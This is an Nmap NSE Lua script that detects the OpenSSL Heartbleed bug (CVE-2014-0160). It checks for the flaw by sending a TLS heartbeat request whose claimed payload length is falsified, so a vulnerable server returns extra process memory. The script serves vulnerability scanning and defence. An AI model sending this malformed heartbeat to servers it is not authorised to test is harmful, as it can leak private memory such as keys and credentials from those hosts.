description = [[
Detects whether a host is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
]]

---
-- @usage
-- nmap -p 443 --script my-ssl-heartbleed-detect <target>
--
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | my-ssl-heartbleed-detect:
-- |   VULNERABLE:
-- |   CVE-2014-0160 OpenSSL Heartbleed Bug
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2014-0160
-- |     Risk factor: High
-- |     Description:
-- |       A missing bounds check in the handling of the TLS heartbeat extension
-- |       can be used to reveal process memory to a connected client or server.
-- |     References:
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
-- |       http://cvedetails.com/cve/2014-0160/
-- |_      http://www.openssl.org/news/secadv_20140407.txt
--
-- @args my-ssl-heartbleed-detect.protocols (default tries all) TLS 1.0, TLS 1.1, or TLS 1.2
--

local bin = require('bin')
local match = require('match')
local nmap = require('nmap')
local shortport = require('shortport')
local sslcert = require('sslcert')
local stdnse = require('stdnse')
local string = require('string')
local table = require('table')
local vulns = require('vulns')
local have_tls, tls = pcall(require,'tls')
assert(have_tls, "This script requires the tls.lua library from http://nmap.org/nsedoc/lib/tls.html")

author = "Patrik Karlsson, Luca Filipozzi"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = { "vuln", "safe" }

-- process script arguments
local protocols = stdnse.get_script_args(SCRIPT_NAME .. ".protocols") or {'TLSv1.0', 'TLSv1.1', 'TLSv1.2'}
if type(protocols) == 'string' then
  protocols = { protocols }
end
for _, ver in ipairs(protocols) do
  local valid_protocol = (tls.PROTOCOLS[ver] ~= nil)
  assert(valid_protocol, "Unsupported protocol version: " .. ver)
end

portrule = function(host, port)
  return shortport.ssl(host, port) or sslcert.isPortSupported(port)
end

local function recvhdr(s)
  local status, hdr = s:receive_buf(match.numbytes(5), true)
  if not status then
    stdnse.print_debug(3, 'Unexpected EOF receiving record header - server closed connection')
    return
  end
  local pos, typ, ver, ln = bin.unpack('>CSS', hdr)
  return status, typ, ver, ln
end

local function recvmsg(s, len)
  local status, pay = s:receive_buf(match.numbytes(len), true)
  if not status then
    stdnse.print_debug(3, 'Unexpected EOF receiving record payload - server closed connection')
    return
  end
  return true, pay
end

local function keys(t)
  local ret = {}
  for k, _ in pairs(t) do
    ret[#ret+1] = k
  end
  return ret
end

local function testversion(host, port, version)

  local hello = tls.client_hello({
      ["protocol"] = version,
      -- Claim to support every cipher
      -- Doesn't work with IIS, but IIS isn't vulnerable
      ["ciphers"] = keys(tls.CIPHERS),
      ["compressors"] = {"NULL"},
      ["extensions"] = {
        -- Claim to support every elliptic curve
        ["elliptic_curves"] = tls.EXTENSION_HELPERS["elliptic_curves"](keys(tls.ELLIPTIC_CURVES)),
        -- Claim to support every EC point format
        ["ec_point_formats"] = tls.EXTENSION_HELPERS["ec_point_formats"](keys(tls.EC_POINT_FORMATS)),
        ["heartbeat"] = "\x01", -- peer_not_allowed_to_send
      },
    })

  local payload = "Nmap ssl-heartbleed"
  local hb = tls.record_write("heartbeat", version, bin.pack("C>SA",
      1, -- HeartbeatMessageType heartbeat_request
      0x4000, -- payload length (falsified)
      -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet
      -- header + 1 to overflow
      payload -- less than payload length.
      )
    )

  local s
  local specialized = sslcert.getPrepareTLSWithoutReconnect(port)
  if specialized then
    local status
    status, s = specialized(host, port)
    if not status then
      stdnse.print_debug(3, "Connection to server failed")
      return
    end
  else
    s = nmap.new_socket()
    local status = s:connect(host, port)
    if not status then
      stdnse.print_debug(3, "Connection to server failed")
      return
    end
  end

  s:set_timeout(5000)

  -- Send Client Hello to the target server
  local status, err = s:send(hello)
  if not status then
    stdnse.print_debug("Couldn't send Client Hello: %s", err)
    s:close()
    return nil
  end

  -- Read response
  local done = false
  local supported = false
  local i = 1
  local response
  repeat
    status, response, err = tls.record_buffer(s, response, i)
    if err == "TIMEOUT" then
      -- Timed out while waiting for server_hello_done
      -- Could be client certificate required or other message required
      -- Let's just drop out and try sending the heartbeat anyway.
      done = true
      break
    elseif not status then
      stdnse.print_debug("Couldn't receive: %s", err)
      s:close()
      return nil
    end

    local record
    i, record = tls.record_read(response, i)
    if record == nil then
      stdnse.print_debug("%s: Unknown response from server", SCRIPT_NAME)
      s:close()
      return nil
    elseif record.protocol ~= version then
      stdnse.print_debug("%s: Protocol version mismatch", SCRIPT_NAME)
      s:close()
      return nil
    end

    if record.type == "handshake" then
      for _, body in ipairs(record.body) do
        if body.type == "server_hello" then
          if body.extensions and body.extensions["heartbeat"] == "\x01" then
            supported = true
          end
        elseif body.type == "server_hello_done" then
          stdnse.print_debug("we're done!")
          done = true
        end
      end
    end
  until done
  if not supported then
    stdnse.print_debug("%s: Server does not support TLS Heartbeat Requests.", SCRIPT_NAME)
    s:close()
    return nil
  end

  status, err = s:send(hb)
  if not status then
    stdnse.print_debug("Couldn't send heartbeat request: %s", err)
    s:close()
    return nil
  end
  while(true) do
    local status, typ, ver, len = recvhdr(s)
    if not status then
      stdnse.print_debug(1, 'No heartbeat response received, server likely not vulnerable')
      break
    end
    if typ == 24 then
      local pay
      status, pay = recvmsg(s, 0x0fe9)
      s:close()
      if #pay > 3 then
        return true
      else
        stdnse.print_debug(1, 'Server processed malformed heartbeat, but did not return any extra data.')
        break
      end
    elseif typ == 21 then
      stdnse.print_debug(1, 'Server returned error, likely not vulnerable')
      break
    end
  end

end

action = function(host, port)
  local vuln_table = {
    title = "CVE-2014-0160 OpenSSL Heartbleed Bug",
    state = vulns.STATE.NOT_VULN,
    IDS = {
      CVE = 'CVE-2014-0160',
    },
    risk_factor = "High",
    description = [[
A missing bounds check in the handling of the TLS heartbeat extension
can be used to reveal process memory to a connected client or server.]],
    references = {
      'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160',
      'http://www.openssl.org/news/secadv_20140407.txt ',
      'http://cvedetails.com/cve/2014-0160/'
    }
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)

  for _, ver in ipairs(protocols) do
    local status = testversion(host, port, ver)
    if ( status ) then
      vuln_table.state = vulns.STATE.VULN
      break
    end
  end

  return report:make_output(vuln_table)
end

-- vim: set ft=lua ts=2 sw=2 et ai sm:
